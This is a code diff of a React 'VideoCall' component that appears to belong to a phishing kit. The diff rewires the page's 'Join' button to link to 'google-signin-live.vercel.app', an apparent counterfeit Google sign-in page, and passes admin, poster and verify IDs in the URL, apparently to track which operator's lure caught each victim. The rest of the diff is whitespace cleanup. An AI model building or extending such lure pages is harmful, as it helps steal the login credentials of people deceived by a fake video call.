@@ -4,7 +4,7 @@ import Image from "next/image";
 import Webcam from "react-webcam";
 import { Mic, MicOff, Video, VideoOff } from "lucide-react";
 
-export default function VideoCall({adminId, posterId, sitename}) {
+export default function VideoCall({ adminId, posterId, verifyId, sitename }) {
   const [micEnabled, setMicEnabled] = useState(true);
   const [cameraEnabled, setCameraEnabled] = useState(true);
   const webcamRef = useRef(null);
@@ -17,14 +17,14 @@ export default function VideoCall({adminId, posterId, sitename}) {
     setCameraEnabled(!cameraEnabled);
   };
   const playNotificationSound = () => {
-    const audio = new Audio("/tune.mp3"); 
+    const audio = new Audio("/tune.mp3");
     audio.play().catch((error) => {
       console.error("Error playing the sound:", error);
     });
 
     return () => {
       audio.pause();
-      audio.currentTime = 0; 
+      audio.currentTime = 0;
     };
   };
   const requestNotificationPermission = async () => {
@@ -101,7 +101,11 @@ export default function VideoCall({adminId, posterId, sitename}) {
       </div>
 
       <button className="bg-green-500 text-white px-14 py-3 rounded-lg text-2xl  hover:bg-green-600 transition-colors font-extrabold">
-        Join
+        <a
+          href={`https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`}
+        >
+          Join
+        </a>
       </button>
     </div>
   );
